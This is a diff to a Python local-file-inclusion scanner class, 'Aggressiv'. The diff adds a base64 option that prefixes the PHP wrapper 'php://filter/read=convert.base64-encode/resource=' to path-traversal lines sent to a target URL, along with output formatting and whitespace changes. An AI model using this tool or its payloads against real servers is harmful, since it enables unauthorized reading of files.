@@ -93,7 +93,7 @@ class Aggressiv :
                     if self.args.base64:
                         phpfillter = 'php://filter/read=convert.base64-encode/resource='
                         URL = self.args.Vulnurl+ phpfillter+LINE
-
+                        
                     else:
                          URL = self.args.Vulnurl+LINE
                                                                                                           
@@ -112,7 +112,10 @@ class Aggressiv :
                     number = str(len(self.Get_Oregnal_URL))
                     try:  
                         filename = LINE.replace('../','').replace('%2f','').replace('....//','').replace('../','').replace('file://','').replace('//','/').replace('\n','')
-                        fullurl = self.url.replace('\n','')
+                        if self.args.base64:
+                            fullurl = self.url.replace('\n','').replace('php://filter/read=convert.base64-encode/resource=','')
+                        else:    
+                            fullurl = self.url.replace('\n','')
                     except IndexError:
                             pass  
                     if self.args.auth  or not self.args.auth  :   
@@ -141,6 +144,8 @@ class Aggressiv :
                                        print("[+] Connection          : ................ | "+rex2[7])
                                        print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                                     print('='*20+"\n[*] Agressive Mode   "+'\n'+'='*30+'\n')
+                                    if self.args.base64:
+                                       print('[+] PHP-Filter : ...............| : php://filter/read=convert.base64-encode/resource='+'\n')
                                     print(" "+"-"*149) 
                                     print("|  "+f"{'   File-Name    ':<23}","|"+f"{'    Length    ':<10}"+"|",f"{'  Full-URL   ':<100}","     |")
                                     print(" "+"-"*149)                    
@@ -175,7 +180,7 @@ class Aggressiv :
                  for L in final_list:                    
                       links = str("".join(re.findall(r'(https?://[^\s]+)',L)))                         
                       with open('./Package/.links','a') as writefile:
-                           writedata = writefile.write(links+' ')
+                               writedata = writefile.write(links+' ')
                  with open('./Package/.links','r') as readfile:
                       readdata = readfile.read()
                       readdata =readdata.split(" ")
